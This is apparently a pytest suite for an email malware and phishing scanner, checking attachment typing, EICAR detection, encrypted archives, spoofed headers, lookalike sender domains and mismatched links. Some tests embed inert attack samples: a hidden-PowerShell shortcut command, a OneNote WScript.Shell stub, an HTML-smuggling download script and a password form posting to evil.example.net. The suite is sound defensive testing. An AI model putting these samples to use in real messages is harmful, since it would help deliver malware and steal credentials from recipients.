"""Tests for aegis.scanners.email: real RFC 5322 messages are built with the stdlib email package (EICAR comes from the
conftest fixture, assembled at runtime so the repository never contains the literal test string)."""

import io
import json
import mailbox
import os
import struct
import time
import zipfile
from email.message import EmailMessage

import pytest

from aegis.core.models import CheckResult, CheckStatus, Finding, Severity
from aegis.scanners import email as em
from aegis.scanners.base import REGISTRY, load_all


# ---------------------------------------------------------------- message builders
def build_msg(subject="Quarterly notes", from_="Alice Example <alice@example.com>", body="Hi Bob, notes attached.", html=None,
              headers=None, attachments=(), to="bob@example.org"):
    msg = EmailMessage()
    msg["From"], msg["To"], msg["Subject"] = from_, to, subject
    msg["Date"] = "Wed, 14 Oct 2026 10:00:00 +0000"
    msg["Message-ID"] = "<abc123@example.com>"
    for k, v in (headers or {}).items():
        msg[k] = v
    msg.set_content(body)
    if html:
        msg.add_alternative(html, subtype="html")
    for name, data, mime in attachments:
        main, sub = mime.split("/", 1)
        msg.add_attachment(data, maintype=main, subtype=sub, filename=name)
    return msg


def eml_bytes(**kw):
    return build_msg(**kw).as_bytes()


GOOD_AUTH = {"Authentication-Results": "mx.example.org; spf=pass smtp.mailfrom=example.com; dkim=pass header.d=example.com; dmarc=pass header.from=example.com",
             "Return-Path": "<alice@example.com>"}


def zip_bytes(members):
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as z:
        for n, d in members.items():
            z.writestr(n, d)
    return bio.getvalue()


def encrypted_zip(name="secret.docx", data=b"x" * 50):
    """A zip whose entries carry the 'encrypted' general-purpose flag (zipfile cannot write encrypted archives)."""
    raw = bytearray(zip_bytes({name: data}))
    i = raw.find(b"PK\x03\x04")
    struct.pack_into("<H", raw, i + 6, struct.unpack_from("<H", raw, i + 6)[0] | 1)
    j = raw.find(b"PK\x01\x02")
    struct.pack_into("<H", raw, j + 8, struct.unpack_from("<H", raw, j + 8)[0] | 1)
    return bytes(raw)


def rules(findings):
    return [f.rule_id for f in findings]


def by_rule(findings, rule):
    got = [f for f in findings if f.rule_id == rule]
    assert got, f"{rule} missing from {rules(findings)}"
    return got


def lnk_bytes(command):
    return b"L\x00\x00\x00\x01\x14\x02\x00" + b"\0" * 60 + command.encode("utf-16-le")


# ---------------------------------------------------------------- benign mail
def test_benign_mail_produces_no_findings(ctx):
    html = ('<html><body><p>Hello Bob, see <a href="https://www.example.com/report">www.example.com/report</a> and '
            '<a href="https://example.com/a">our site</a>. Track: <a href="https://links.mailchimp.com/x">example.com</a></p></body></html>')
    data = eml_bytes(body="Plain text with https://example.org/docs link", html=html, headers=GOOD_AUTH, attachments=[
        ("notes.txt", b"just some notes", "text/plain"), ("report.pdf", b"%PDF-1.4\n1 0 obj\n<<>>\nendobj\n%%EOF", "application/pdf"),
        ("photo.png", b"\x89PNG\r\n\x1a\n" + b"\0" * 64, "image/png"),
        ("minutes.docx", zip_bytes({"[Content_Types].xml": "<x/>", "word/document.xml": "<w/>"}), "application/octet-stream"),
        ("bundle.zip", zip_bytes({"readme.txt": "hello", "pic.jpg": b"\xff\xd8\xff"}), "application/zip")])
    assert em.analyse_eml(data, ctx) == []
    assert ctx.stats["email_attachments"] == 5


def test_plain_message_without_attachments(ctx):
    assert em.analyse_eml(eml_bytes(headers=GOOD_AUTH), ctx) == []
    assert em.analyse_eml(eml_bytes(from_="newsletter@news.example.org", headers={
        "Return-Path": "<bounce-123@amazonses.com>", "Reply-To": "support@news.example.org"}), ctx) == []


# ---------------------------------------------------------------- malicious attachments
def test_eicar_attachment_with_double_extension(ctx, eicar_bytes, tmp_path):
    p = tmp_path / "message.eml"
    p.write_bytes(eml_bytes(subject="Invoice 4471", attachments=[("invoice.pdf.exe", eicar_bytes, "application/octet-stream")]))
    f = em.analyse_eml(p, ctx)
    loc = f"{p}!invoice.pdf.exe"
    assert f and all(x.location == loc for x in f if x.rule_id != "AEG-EMAIL-AUTH")
    assert max(x.severity for x in f) >= Severity.HIGH
    types = by_rule(f, "AEG-EMAIL-DANGEROUS")[0]
    assert types.severity == Severity.HIGH and types.evidence["extension"] == "exe" and types.evidence["email_subject"] == "Invoice 4471"
    assert types.remediation.action == "quarantine_file" and types.remediation.params["path"] == str(p)  # the .eml, not a name
    assert any(x.rule_id != "AEG-EMAIL-DANGEROUS" for x in f)  # content analysis flagged it too
    json.dumps([x.to_dict() for x in f])


def test_eicar_inside_zip_attachment_reports_nested_location(ctx, eicar_bytes, tmp_path):
    p = tmp_path / "message.eml"
    p.write_bytes(eml_bytes(attachments=[("docs.zip", zip_bytes({"eicar.com": eicar_bytes, "ok.txt": b"fine"}), "application/zip")]))
    f = em.analyse_eml(p, ctx)
    assert any(x.location == f"{p}!docs.zip!eicar.com" for x in f)
    assert all(x.remediation is None or x.remediation.params["path"] == str(p) for x in f)


def test_eicar_in_nested_forwarded_message(ctx, eicar_bytes, tmp_path):
    inner = build_msg(subject="Forwarded invoice", attachments=[("pay.scr", eicar_bytes, "application/octet-stream")])
    outer = build_msg(subject="Fwd: invoice")
    outer.add_attachment(inner)
    p = tmp_path / "outer.eml"
    p.write_bytes(outer.as_bytes())
    f = em.analyse_eml(p, ctx)
    assert any(x.location == f"{p}!Forwarded invoice.eml!pay.scr" for x in f), [x.location for x in f]
    assert max(x.severity for x in f) >= Severity.HIGH


@pytest.mark.parametrize("name,data,sev", [
    ("run.exe", b"MZ" + b"\0" * 80, Severity.HIGH), ("a.scr", b"MZ" + b"\0" * 80, Severity.HIGH), ("a.cpl", b"MZ" + b"\0" * 80, Severity.HIGH),
    ("a.jar", b"PK\x03\x04" + b"\0" * 30, Severity.HIGH), ("a.hta", b"<html><script>1</script></html>", Severity.HIGH),
    ("a.js", b"var a = 1;", Severity.HIGH), ("a.vbs", b"MsgBox 1", Severity.HIGH), ("a.wsf", b"<job/>", Severity.HIGH),
    ("a.ps1", b"Get-Date", Severity.HIGH), ("a.bat", b"@echo off", Severity.HIGH), ("a.msi", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 20, Severity.HIGH),
    ("a.chm", b"ITSF\x03\0\0\0", Severity.MEDIUM), ("a.lnk", lnk_bytes("C:\\Program Files\\x\\y.exe"), Severity.MEDIUM),
    ("a.iso", b"CD001" + b"\0" * 100, Severity.MEDIUM), ("a.one", b"\xe4\x52\x5c\x7b" + b"\0" * 40, Severity.MEDIUM),
    ("a.docm", zip_bytes({"word/vbaProject.bin": b"x"}), Severity.LOW), ("a.html", b"<html><body>hi</body></html>", Severity.LOW),
])
def test_dangerous_attachment_types(ctx, name, data, sev):
    f = em.analyse_eml(eml_bytes(headers=GOOD_AUTH, attachments=[(name, data, "application/octet-stream")]), ctx)
    d = by_rule(f, "AEG-EMAIL-DANGEROUS")[0]
    assert d.severity == sev, (name, d.severity)
    assert d.location == f"<message>!{name}" and d.evidence["attachment"] == name


def test_disk_image_and_shortcut_content_raise_severity(ctx):
    iso = b"CD001" + b"\0" * 2000 + b"INVOICE.LNK;1" + b"\0" * 50 + b"DOC.DLL;1" + b"\0" * 50
    f = em.analyse_eml(eml_bytes(headers=GOOD_AUTH, attachments=[("scan.iso", iso, "application/x-iso9660-image")]), ctx)
    d = by_rule(f, "AEG-EMAIL-DANGEROUS")[0]
    assert d.severity == Severity.HIGH and "INVOICE.LNK" in d.evidence["contains"] and d.remediation is None  # in-memory message: nothing to quarantine
    lnk = em.analyse_eml(eml_bytes(headers=GOOD_AUTH, attachments=[("docs.lnk", lnk_bytes("cmd.exe /c powershell -w hidden calc"), "application/octet-stream")]), ctx)
    assert by_rule(lnk, "AEG-EMAIL-DANGEROUS")[0].severity == Severity.HIGH


def test_onenote_with_embedded_script_is_high(ctx):
    one = b"\xe4\x52\x5c\x7b" + b"\0" * 60 + b'Set s = CreateObject("WScript.Shell")\r\ns.Run "powershell -nop"'
    f = em.analyse_eml(eml_bytes(headers=GOOD_AUTH, attachments=[("invoice.one", one, "application/octet-stream")]), ctx)
    d = by_rule(f, "AEG-EMAIL-DANGEROUS")[0]
    assert d.severity == Severity.HIGH and d.evidence["indicators"]
    exe_one = b"\xe4\x52\x5c\x7b" + b"MZ" + b"\0" * 20 + b"This program cannot be run in DOS mode" + b"\0" * 40
    assert em.onenote_indicators(exe_one) == ["an embedded Windows program"]
    assert em.onenote_indicators(b"\xe4\x52\x5c\x7b" + b"\0" * 100) == []


def test_html_smuggling_and_password_form(ctx):
    smuggle = b"<html><script>var d=atob('TVqQ');var b=new Blob([d]);var a=document.createElement('a');a.href=URL.createObjectURL(b);a.click()</script></html>"
    f = em.analyse_eml(eml_bytes(headers=GOOD_AUTH, attachments=[("invoice.html", smuggle, "text/html")]), ctx)
    s = by_rule(f, "AEG-EMAIL-HTMLSMUGGLE")[0]
    assert s.severity == Severity.HIGH and "T1027.006" in s.mitre
    form = b'<html><form action="https://evil.example.net/p"><input type="password" name="p"></form></html>'
    f2 = em.analyse_eml(eml_bytes(headers=GOOD_AUTH, attachments=[("login.htm", form, "text/html")]), ctx)
    assert by_rule(f2, "AEG-EMAIL-PHISHFORM")[0].severity == Severity.MEDIUM
    benign = em.analyse_eml(eml_bytes(headers=GOOD_AUTH, attachments=[("receipt.html", b"<html><body><p>Thanks</p></body></html>", "text/html")]), ctx)
    assert rules(benign) == ["AEG-EMAIL-DANGEROUS"] and benign[0].severity == Severity.LOW


# ---------------------------------------------------------------- encrypted archives
def test_encrypted_zip_with_and_without_password_hint(ctx):
    z = encrypted_zip("invoice.exe")
    no_hint = em.analyse_eml(eml_bytes(headers=GOOD_AUTH, attachments=[("documents.zip", z, "application/zip")]), ctx)
    e = by_rule(no_hint, "AEG-EMAIL-ENCRYPTED")[0]
    assert e.severity == Severity.MEDIUM and "T1027.013" in e.mitre and e.evidence["password_in_body"] is False
    hinted = em.analyse_eml(eml_bytes(body="Please open the attached archive. Password: 4471", headers=GOOD_AUTH,
                                      attachments=[("documents.zip", z, "application/zip")]), ctx)
    assert by_rule(hinted, "AEG-EMAIL-ENCRYPTED")[0].severity == Severity.HIGH


def test_encrypted_archive_detection_other_formats():
    assert em.encrypted_archive_info(zip_bytes({"a.txt": "x"}), "zip") is None
    assert em.encrypted_archive_info(encrypted_zip("a.txt"), "zip").startswith("password-protected ZIP")
    assert em.encrypted_archive_info(encrypted_zip("a.xml"), "docx") is None  # Office files are zips by design
    assert em.encrypted_archive_info(b"7z\xbc\xaf\x27\x1c" + b"\0" * 200 + b"\x06\xf1\x07\x01" + b"\0" * 20, "7z")
    assert em.encrypted_archive_info(b"7z\xbc\xaf\x27\x1c" + b"\0" * 200, "7z") is None
    rar4 = b"Rar!\x1a\x07\x00" + b"\0\0" + b"\x73" + struct.pack("<H", 0x0080) + b"\0" * 20
    assert em.encrypted_archive_info(rar4, "rar")
    assert em.encrypted_archive_info(b"Rar!\x1a\x07\x00" + b"\0\0\x73\0\0" + b"\0" * 20, "rar") is None
    rar5 = b"Rar!\x1a\x07\x01\x00" + b"\0\0\0\0" + b"\x05" + b"\x04" + b"\0" * 20
    assert em.encrypted_archive_info(rar5, "rar")
    assert em.encrypted_archive_info(b"Rar!\x1a\x07\x01\x00" + b"\0\0\0\0" + b"\x05" + b"\x01" + b"\0" * 20, "rar") is None
    assert em.encrypted_archive_info(b"PK\x03\x04garbage", "zip") is None and em.encrypted_archive_info(b"", "zip") is None


# ---------------------------------------------------------------- header spoofing
def hdr_issues(**kw):
    msg = em._parse(eml_bytes(**kw))
    return em.analyse_headers(msg)


def test_authentication_results():
    ok = hdr_issues(headers=GOOD_AUTH)
    assert ok == []
    dm = hdr_issues(headers={"Authentication-Results": "mx.example.org; spf=pass; dkim=pass; dmarc=fail action=none header.from=example.com"})
    assert [i.rule for i in dm] == ["AEG-EMAIL-AUTH"] and dm[0].severity == Severity.MEDIUM
    soft = hdr_issues(headers={"Authentication-Results": "mx.example.org; spf=softfail smtp.mailfrom=x; dkim=pass; dmarc=pass"})
    assert soft[0].severity == Severity.LOW
    both = hdr_issues(headers={"Authentication-Results": "mx; spf=fail; dkim=fail; dmarc=pass"})
    assert both[0].severity == Severity.MEDIUM
    rspf = hdr_issues(headers={"Received-SPF": "fail (domain does not designate sender)"})
    assert rspf and rspf[0].rule == "AEG-EMAIL-AUTH"
    # only the first (receiving server's) Authentication-Results header counts
    msg = em._parse(eml_bytes())
    msg.add_header("Authentication-Results", "mx1; spf=pass; dkim=pass; dmarc=pass")
    msg.add_header("Authentication-Results", "upstream; spf=fail; dmarc=fail")
    assert em.analyse_headers(msg) == []


def test_mismatched_return_path_and_reply_to():
    f = hdr_issues(headers={"Return-Path": "<bounce@evil-mail.ru>", "Reply-To": "boss.reply@gmail.com"})
    assert [i.rule for i in f] == ["AEG-EMAIL-MISMATCH"] and f[0].severity == Severity.MEDIUM
    assert "free webmail" in f[0].description
    only_rp = hdr_issues(headers={"Return-Path": "<bounce@evil-mail.ru>"})
    assert only_rp[0].severity == Severity.LOW
    assert hdr_issues(headers={"Return-Path": "<x@bounce.example.com>", "Reply-To": "sales@example.com"}) == []  # same registered domain
    assert hdr_issues(headers={"Return-Path": "<0102@us-west-2.amazonses.com>"}) == []  # bulk-mail infrastructure


@pytest.mark.parametrize("from_,expect", [
    ("PayPal Support <service@paypa1-security.com>", True),
    ("Microsoft Account Team <security@micros0ft-support.com>", True),
    ("PayPal <noreply@paypal.com>", False),
    ("Microsoft Account Team <account-security-noreply@accountprotection.microsoft.com>", False),
    ("Apple Pie Recipes <news@bakery.example>", False),
    ("Amazon <store-news@amazon.com>", False),
    ("DHL Delivery <tracking@dhl-parcel-info.net>", True),
    ("Alice Example <alice@example.com>", False),
    ('"support@paypal.com" <x@evil-mail.ru>', True),
])
def test_brand_impersonation(from_, expect):
    got = [i for i in hdr_issues(from_=from_) if i.rule == "AEG-EMAIL-IMPERSONATE"]
    assert bool(got) is expect, [i.title for i in got]
    if expect:
        assert all(i.severity >= Severity.MEDIUM for i in got)


def test_lookalike_sender_domain_and_known_bad_domain(ctx):
    f = hdr_issues(from_="Billing <billing@paypa1.com>")
    assert any("looks like a fake" in i.title or "imitates" in i.title for i in f)

    class Sigs:
        def is_bad_domain(self, d):
            return d == "evil-mail.ru"

    msg = em._parse(eml_bytes(from_="x@evil-mail.ru"))
    got = em.analyse_headers(msg, Sigs())
    assert got[0].severity == Severity.HIGH and "malicious-domain" in got[0].title


def test_spoofing_findings_are_emitted_with_message_location(ctx, tmp_path):
    p = tmp_path / "phish.eml"
    p.write_bytes(eml_bytes(from_="PayPal Support <service@paypa1-security.com>", headers={
        "Authentication-Results": "mx; spf=fail; dkim=fail; dmarc=fail", "Return-Path": "<x@bad-host.ru>"}))
    f = em.analyse_eml(p, ctx)
    assert {"AEG-EMAIL-AUTH", "AEG-EMAIL-IMPERSONATE", "AEG-EMAIL-MISMATCH"} <= set(rules(f))
    assert all(x.location == str(p) for x in f) and all(x.remediation is None for x in f)  # spoofing alone: nothing to quarantine
    # a spoofed sender WITH a risky attachment is bumped up
    p2 = tmp_path / "phish2.eml"
    p2.write_bytes(eml_bytes(from_="Alice <alice@example.com>", headers={"Authentication-Results": "mx; spf=softfail; dkim=pass"},
                             attachments=[("a.js", b"var a;", "text/javascript")]))
    auth = by_rule(em.analyse_eml(p2, ctx), "AEG-EMAIL-AUTH")[0]
    assert auth.severity == Severity.MEDIUM  # LOW softfail + risky attachment


# ---------------------------------------------------------------- links
def link_issues(html, text_urls=()):
    page = em.parse_html(html)
    return em.analyse_links(page.anchors, text_urls)


def test_link_text_points_elsewhere_brand_vs_ordinary():
    brand = link_issues('<a href="http://evil.example.net/login">www.paypal.com/signin</a>')
    assert brand[0].rule == "AEG-EMAIL-LINK-MISMATCH" and brand[0].severity == Severity.HIGH
    assert brand[0].evidence["links"][0]["shown_domain"] == "paypal.com" and brand[0].evidence["links"][0]["real_domain"] == "example.net"
    other = link_issues('<a href="https://tracker.otherhost.org/c?id=1">www.acme-corp.com</a>')
    assert other[0].severity == Severity.LOW
    assert link_issues('<a href="https://click.example.com/x">www.example.com/offer</a>') == []  # same registered domain
    assert link_issues('<a href="https://u123.ct.sendgrid.net/ls/click">www.acme-corp.com</a>') == []  # ESP tracking redirect
    assert link_issues('<a href="https://example.org/a">Click here</a><a href="mailto:a@b.c">a@b.c</a>') == []  # no domain in text
    assert link_issues('<a href="https://evil.example.net/">Mr.Smith</a>') == []  # not a domain


def test_malicious_and_suspicious_urls():
    bad = link_issues('<a href="https://paypal-secure-login.com/">Verify now</a>')
    assert bad[0].rule == "AEG-EMAIL-LINK-BAD" and bad[0].severity == Severity.HIGH
    sus = link_issues('<a href="https://bit.ly/abc123">Open</a>')
    assert sus[0].rule == "AEG-EMAIL-LINK-SUSPECT" and sus[0].severity == Severity.LOW
    plain = em.analyse_links([], ["https://paypal-secure-login.com/verify"])
    assert plain[0].rule == "AEG-EMAIL-LINK-BAD"
    assert em.analyse_links([], ["https://example.com/ok"]) == []


def test_html_body_links_end_to_end(ctx, tmp_path):
    html = '<html><body><a href="http://evil.example.net/x">www.microsoft.com</a> <a href="https://paypal-secure-login.com/">Account</a></body></html>'
    p = tmp_path / "m.eml"
    p.write_bytes(eml_bytes(html=html, headers=GOOD_AUTH))
    f = em.analyse_eml(p, ctx)
    assert {"AEG-EMAIL-LINK-MISMATCH", "AEG-EMAIL-LINK-BAD"} <= set(rules(f))
    assert all(x.location == str(p) for x in f)
    bad = by_rule(f, "AEG-EMAIL-LINK-BAD")[0]
    assert bad.category == "malware" and bad.remediation.params["path"] == str(p)


def test_parse_html_collects_forms_and_anchors():
    page = em.parse_html('<a href=" https://a.example/ ">  Hello <b>world</b> </a><form action="/x"><input type="PASSWORD"></form><a href="#">broken')
    assert page.anchors[0] == ("https://a.example/", "Hello world") and page.password_input and page.forms == ["/x"]
    assert len(page.anchors) == 2
    em.parse_html("<<<>>><a href=")  # malformed input must not raise


# ---------------------------------------------------------------- analyse_eml API robustness
def test_analyse_eml_accepts_bytes_str_and_path_and_never_raises(ctx, eicar_bytes, tmp_path):
    raw = eml_bytes(attachments=[("x.exe", eicar_bytes, "application/octet-stream")])
    from_bytes = em.analyse_eml(raw, ctx)
    assert from_bytes and all(x.remediation is None for x in from_bytes) and all(x.location.startswith("<message>!") for x in from_bytes)
    p = tmp_path / "a.eml"
    p.write_bytes(raw)
    assert em.analyse_eml(str(p), ctx) and em.analyse_eml(p, ctx)
    for junk in (b"", b"\x00\x01\x02", os.urandom(2000), b"From: \xff\xfe\r\nSubject: =?utf-8?Q?=ZZ?=\r\n\r\nbody", raw[:120]):
        assert isinstance(em.analyse_eml(junk, ctx), list)
    assert em.analyse_eml(tmp_path / "missing.eml", ctx) == []
    assert em.analyse_eml(12345, ctx) == []  # type: ignore[arg-type]


def test_filename_cleaning_and_odd_attachments(ctx):
    assert em.clean_filename("..\\..\\Windows\\evil.exe") == "evil.exe" and em.clean_filename("a/b/c.txt") == "c.txt"
    assert em.clean_filename("bad\x00name\x07.exe") == "badname.exe"
    # attachment without a name, and a very large declared attachment: no crash
    msg = build_msg()
    msg.add_attachment(b"\x00" * 10, maintype="application", subtype="octet-stream")
    assert isinstance(em.analyse_eml(msg.as_bytes(), ctx), list)


def test_rtlo_attachment_name_is_flagged(ctx, eicar_bytes):
    name = "invoice\u202egpj.exe"  # displays as invoice exe.jpg
    f = em.analyse_eml(eml_bytes(headers=GOOD_AUTH, attachments=[(name, eicar_bytes, "application/octet-stream")]), ctx)
    assert any(x.severity >= Severity.HIGH for x in f)


# ---------------------------------------------------------------- mbox
def write_mbox(path, messages):
    mb = mailbox.mbox(str(path))
    for m in messages:
        mb.add(m)
    mb.flush()
    mb.close()


def test_iter_mbox_messages_and_looks_like_mbox(tmp_path, eicar_bytes):
    path = tmp_path / "Inbox"
    write_mbox(path, [build_msg(subject="one"), build_msg(subject="two", body="From the desk of Bob\n\nFrom here we go"),
                      build_msg(subject="three", attachments=[("x.exe", eicar_bytes, "application/octet-stream")])])
    assert em.looks_like_mbox(str(path)) and not em.looks_like_mbox(str(tmp_path / "nope"))
    msgs = list(em.iter_mbox_messages(str(path)))
    assert len(msgs) == 3
    parsed = [em._parse(m) for m in msgs]
    assert [m["Subject"] for m in parsed] == ["one", "two", "three"]
    assert "From here we go" in parsed[1].get_content()  # mid-body 'From ' lines are quoted by mbox, not separators
    assert len(list(em.iter_mbox_messages(str(path), max_messages=2))) == 2
    # tail window: only the newest messages when the file is larger than the cap
    many = tmp_path / "Many"
    write_mbox(many, [build_msg(subject=f"m{i}", body="x" * 300) for i in range(8)])
    tail = list(em.iter_mbox_messages(str(many), max_bytes=os.path.getsize(many) // 2))
    assert 1 <= len(tail) < 8 and em._parse(tail[-1])["Subject"] == "m7"
    # an oversize message is skipped, the others survive
    small = list(em.iter_mbox_messages(str(path), max_msg_bytes=700))
    assert 0 < len(small) < 3


def test_discover_thunderbird_mbox(tmp_path):
    prof = tmp_path / "abc.default"
    (prof / "Mail" / "pop.example.com").mkdir(parents=True)
    (prof / "ImapMail" / "imap.example.com" / "INBOX.sbd").mkdir(parents=True)
    write_mbox(prof / "Mail" / "pop.example.com" / "Inbox", [build_msg()])
    (prof / "Mail" / "pop.example.com" / "Inbox.msf").write_text("// <!-- <mdb:mork:z v=\"1.4\"/> -->")
    write_mbox(prof / "ImapMail" / "imap.example.com" / "INBOX", [build_msg()])
    write_mbox(prof / "ImapMail" / "imap.example.com" / "INBOX.sbd" / "Sub", [build_msg()])
    (prof / "ImapMail" / "imap.example.com" / "notes").write_text("not a mailbox")
    found = em.discover_thunderbird_mbox([prof])
    assert sorted(os.path.basename(f) for f in found) == ["INBOX", "Inbox", "Sub"]
    assert em.discover_thunderbird_mbox([tmp_path / "missing"]) == []


# ---------------------------------------------------------------- discovery of .eml files
def test_find_eml_files_limits(tmp_path):
    (tmp_path / "a").mkdir()
    (tmp_path / "a" / "one.eml").write_bytes(b"x")
    (tmp_path / "TWO.EML").write_bytes(b"x")
    (tmp_path / "node_modules").mkdir()
    (tmp_path / "node_modules" / "skip.eml").write_bytes(b"x")
    deep = tmp_path / "d1" / "d2" / "d3" / "d4" / "d5" / "d6" / "d7"
    deep.mkdir(parents=True)
    (deep / "deep.eml").write_bytes(b"x")
    got = em.find_eml_files([tmp_path], time.monotonic() + 30)
    assert sorted(os.path.basename(p) for p in got) == ["TWO.EML", "one.eml"]
    assert len(em.find_eml_files([tmp_path], time.monotonic() + 30, limit=1)) == 1
    assert em.find_eml_files([tmp_path], time.monotonic() - 1) == []
    assert any(p.endswith("deep.eml") for p in em.find_eml_files([tmp_path], time.monotonic() + 30, depth=10))


# ---------------------------------------------------------------- scanner
def test_scanner_end_to_end(ctx, eicar_bytes, tmp_path):
    mails = tmp_path / "mail"
    mails.mkdir()
    (mails / "good.eml").write_bytes(eml_bytes(headers=GOOD_AUTH, attachments=[("notes.txt", b"hi", "text/plain")]))
    (mails / "evil.eml").write_bytes(eml_bytes(subject="Payment", attachments=[("pay.scr", eicar_bytes, "application/octet-stream")]))
    mbox = tmp_path / "Inbox"
    write_mbox(mbox, [build_msg(subject="ok"), build_msg(subject="bad", attachments=[("x.js", b"var a;", "text/javascript")])])
    outlook = tmp_path / "Content.Outlook" / "ABC123"
    outlook.mkdir(parents=True)
    (outlook / "setup.exe").write_bytes(b"MZ" + b"\0" * 100)
    (outlook / "notes.txt").write_text("plain")
    ctx.options.update({"email_roots": [str(mails)], "email_mbox_files": [str(mbox)], "email_outlook_dirs": [str(tmp_path / "Content.Outlook")]})
    out = list(em.EmailScanner().run(ctx))
    findings = [x for x in out if isinstance(x, Finding)]
    check = [x for x in out if isinstance(x, CheckResult)][-1]
    assert check.check_id == "AEG-EMAIL-SCAN" and check.status == CheckStatus.FAIL and "2 .eml file(s), 1 mailbox file(s)" in check.detail
    locs = {f.location for f in findings}
    assert str(mails / "evil.eml") + "!pay.scr" in locs
    assert str(mbox) + "#2!x.js" in locs  # mbox findings point at message number + attachment
    mbox_findings = [f for f in findings if f.location.startswith(str(mbox))]
    assert mbox_findings and all(f.remediation is None for f in mbox_findings)  # never quarantine a whole mailbox
    assert not any(f.location.startswith(str(mails / "good.eml")) for f in findings)
    opened = by_rule(findings, "AEG-EMAIL-OPENED")[0]
    assert opened.severity == Severity.HIGH and opened.location == str(outlook / "setup.exe") and opened.remediation.action == "quarantine_file"
    json.dumps([x.to_dict() for x in out])


def test_scanner_nothing_to_scan_and_clean_store(ctx, tmp_path):
    ctx.options.update({"email_roots": [str(tmp_path / "none")], "email_mbox_files": [], "email_outlook_dirs": []})
    out = list(em.EmailScanner().run(ctx))
    assert len(out) == 1 and out[0].status == CheckStatus.SKIP
    mails = tmp_path / "mail"
    mails.mkdir()
    (mails / "ok.eml").write_bytes(eml_bytes(headers=GOOD_AUTH))
    ctx.options.update({"email_roots": [str(mails)]})
    out = list(em.EmailScanner().run(ctx))
    assert [x for x in out if isinstance(x, Finding)] == [] and out[-1].status == CheckStatus.PASS


def test_scanner_registered_and_does_not_shadow_stdlib():
    load_all()
    cls = REGISTRY["email"]
    assert set(cls.platforms) == {"windows", "linux", "darwin"} and cls.title and cls.description
    import email as stdlib_email

    assert hasattr(stdlib_email, "message_from_bytes")  # the stdlib package is still the top-level 'email'
    assert em.__name__ == "aegis.scanners.email"
